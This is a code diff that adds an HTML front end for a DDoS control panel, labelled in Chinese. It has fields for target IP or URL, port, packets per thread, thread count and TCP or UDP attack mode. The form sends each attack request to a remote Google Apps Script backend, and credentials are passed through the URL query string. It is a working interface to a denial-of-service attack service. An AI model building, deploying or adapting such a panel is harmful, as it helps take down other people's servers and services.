@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>XTools_DDos控制台</title>
+    <link rel="stylesheet" href="main_style.css">
+  </head>
+  <body>
+    <div class="center">
+      <h1>XTools-DDos控制台</h1>
+      <form id="target_form" action="https://script.google.com/macros/s/AKfycbwRbm-3HTWoA1wysIWNcXRKtqz2s7i73rTAfoRYQ7EfN1HdyEMYPTBAGcVWJa0EU372/exec" method="POST" target="nm_iframe">
+        
+		<input id="Method" name="Method" value="atk_target" style="display: none" required>
+		
+		<input id="user" name="user" value="null" style="display: none" required>
+		
+		<input id="pw" name="pw" value="null" style="display: none" required>
+		
+		<div class="txt_field">
+          <input name="target_ip" id="target_ip" type="text" required>
+          <span></span>
+          <label>目標IP或網址</label>
+        </div>
+        <div class="txt_field">
+          <input name="target_port" id="target_port" required>
+          <span></span>
+          <label>端口(Port)</label>
+        </div>
+		 <div class="txt_field">
+          <input name="target_packet" id="target_packet" required>
+          <span></span>
+          <label>每個線程發多少包</label>
+        </div>
+		 <div class="txt_field">
+          <input name="target_thread" id="target_thread" required>
+          <span></span>
+          <label>創建多少個攻擊線程</label>
+        </div>
+		 <div>
+          <label class="txt_field_2">攻擊模式:</label>
+		  <label class="txt_field_2"><input type="radio" name="atk_method" value="TCP" checked="true" id="tcp">  TCP  </label>
+		  <label class="txt_field_2"><input type="radio" name="atk_method" value="UDP" id="udp">  UDP  </label>
+		  </div>
+		<a></a>
+        <input type="submit" id="submit" value="提交攻擊請求">
+
+      </form>
+      <iframe id="id_iframe" name="nm_iframe" style="display:none;"></iframe>
+    </div>
+
+  </body>
+
+  <script>
+
+function GetReq(name) {
+     var url = decodeURI(location.search); //获取url中"?"符后的字符串
+     var theRequest = new Object();
+     if (url.indexOf("?") != -1) {
+         var str = url.substr(1);
+         strs = str.split("&");
+         for (var i = 0; i < strs.length; i++) {
+             theRequest[strs[i].split("=")[0]] = decodeURI(strs[i].split("=")[1]);	
+		}
+     }
+     return theRequest[""+name];
+}
+ 
+ submit.addEventListener('click', () => {
+
+   var v0 = document.getElementById("target_ip").value;
+   var v1 = document.getElementById("target_port").value;
+   var v2 = document.getElementById("target_packet").value;
+   var v3 = document.getElementById("target_thread").value;
+   
+
+      if(v0 == "" || v1 =="" || v2 == "" || v3 ==""){
+        alert("參數請勿填空!");
+        return;
+      }
+	  
+	  document.getElementById("user").value = GetReq("user");
+	  
+	  document.getElementById("pw").value = GetReq("pw");
+	 
+	  //跳轉登入
+       //location.href="https://script.google.com/macros/s/AKfycbzN7wSlgalNkeCvbdGoJti9US0-RvNgvzYCDXsp6Qkz4mLEnlcZj0D7Sg6pjUn6ObPz/exec?Method=loginto&user="+user_input+"&pw="+pw_input+"";
+    });
+	
+ </script>
+</html>
